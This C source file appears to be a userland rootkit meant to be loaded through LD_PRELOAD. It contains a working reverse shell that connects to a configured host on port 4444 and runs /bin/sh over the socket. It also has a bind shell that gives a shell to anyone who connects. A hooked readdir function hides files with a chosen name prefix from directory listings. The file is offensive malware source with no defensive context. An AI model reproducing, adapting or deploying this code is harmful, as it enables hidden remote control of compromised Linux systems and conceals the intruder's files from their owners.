#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "config.h"


//reverse shell implementation
int rev_shell()
{
    int sock;
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    inet_aton(host, &serv_addr.sin_addr);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}


//bind shell implementation
int bind_shell()
{
    struct sockaddr_in serv_addr;
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LISTENING_PORT);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    bind(sock_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    listen(sock_fd, 5);

    int client_fd = accept(sock_fd, NULL, NULL);
    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);

    execve("/bin/sh", NULL, NULL);
    close(sock_fd);

    return 0;
}


//function pointer to the original readdir
struct dirent* (*original_readdir)(DIR *) = NULL;

//DIR* is a stream of the files as entries from the directory 
struct dirent *readdir(DIR *dirp)
{
    if (original_readdir == NULL)
    {
        //finds the offset of the next occurence of readdir
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *results = original_readdir(dirp);
    while (results != NULL && !strncmp(results->d_name, FILENAME, strlen(FILENAME)))
    {
        //move onto the next entry in the stream
        results = original_readdir(dirp);
    }

    return results;
}